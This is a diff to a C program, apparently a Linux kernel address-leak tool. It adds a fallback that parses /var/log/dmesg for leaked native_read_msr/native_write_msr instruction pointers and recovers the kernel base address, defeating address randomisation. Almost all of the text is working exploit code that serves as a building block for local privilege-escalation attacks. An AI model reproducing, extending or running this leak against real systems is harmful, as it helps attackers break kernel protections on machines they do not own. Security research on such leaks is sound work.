@@ -35,7 +35,8 @@
 // possible kernel base: ffffffffad400000
 //
 // Requires:
-// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities.
+// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities; or
+//   readable /var/log/dmesg.
 //
 // References:
 // https://elixir.bootlin.com/linux/v6.1.1/source/arch/x86/mm/extable.c
@@ -93,8 +94,55 @@ unsigned long search_dmesg_ex_handler_msr() {
   return addr;
 }
 
+unsigned long search_dmesg_log_file_ex_handler_msr() {
+  FILE *f;
+  char *endptr;
+  char *line = 0;
+  char *addr_buf;
+  size_t size = 0;
+  const char *path = "/var/log/dmesg";
+  const char *needle = " at rIP: 0x";
+  unsigned long leaked_addr = 0;
+  unsigned long addr = 0;
+
+  printf(
+      "[.] searching %s for native_[read|write]_msr function pointer ...\n", path);
+
+  f = fopen(path, "rb");
+
+  if (f == NULL) {
+    perror("[-] fopen");
+    return 0;
+  }
+
+  while ((getline(&line, &size, f)) != -1) {
+    addr_buf = strstr(line, needle);
+
+    if (addr_buf == NULL)
+      continue;
+
+    leaked_addr = strtoul(&addr_buf[strlen(needle)], &endptr, 16);
+
+    if (!leaked_addr)
+      continue;
+
+    if (leaked_addr >= KERNEL_BASE_MIN && leaked_addr <= KERNEL_BASE_MAX) {
+      // printf("Found kernel pointer: %lx\n", leaked_addr);
+      if (!addr || leaked_addr < addr)
+        addr = leaked_addr;
+    }
+  }
+
+  fclose(f);
+
+  return addr;
+}
+
 int main() {
   unsigned long addr = search_dmesg_ex_handler_msr();
+  if (!addr)
+    addr = search_dmesg_log_file_ex_handler_msr();
+
   if (!addr)
     return 1;
 
